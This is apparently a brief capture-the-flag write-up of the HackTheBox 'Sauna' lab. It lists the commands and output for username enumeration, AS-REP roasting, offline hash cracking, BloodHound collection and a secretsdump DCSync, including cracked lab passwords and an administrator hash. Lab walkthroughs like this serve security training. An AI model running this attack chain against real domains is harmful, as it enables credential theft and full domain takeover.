---
title: HackTheBox-Sauna
date: 2024-12-23 09:39:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [username-anarchy, asrep]     # TAG names should always be lowercase
---

after getting usernames at Website use [username-anarchy](https://github.com/urbanadventurer/username-anarchy) for create users list

## username-anarchy

    (myenv) ➜  username-anarchy git:(master) ./username-anarchy --input-file ../usernames.txt --select-format first,last,flast,first.last,firstl

## kerbrute

    ➜  sauna /home/elliot/tools/kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL users.txt --dc 10.10.10.175

        __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
    / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
    / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
    /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

    Version: v1.0.3 (9dad6e1) - 12/20/24 - Ronnie Flathers @ropnop

    2024/12/20 04:48:12 >  Using KDC(s):
    2024/12/20 04:48:12 >   10.10.10.175:88

    2024/12/20 04:48:12 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL

## ASREP

    ➜  sauna impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -dc-ip 10.10.10.175

AND CRACK PASS
    ➜  sauna john hash --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)

## bloodhound

    ➜  bloodhound bloodhound-python -d EGOTISTICAL-BANK.LOCAL -c all -u fsmith -p 'Thestrokes23' --zip -ns 10.10.10.175

GRAB PASS AT BLOODHOUND OR LDAPSEARCH

## secretsdump

    ➜  sauna impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::

Video walkthrough
[WATCH!](https://youtu.be/z9GaIPxhaEs)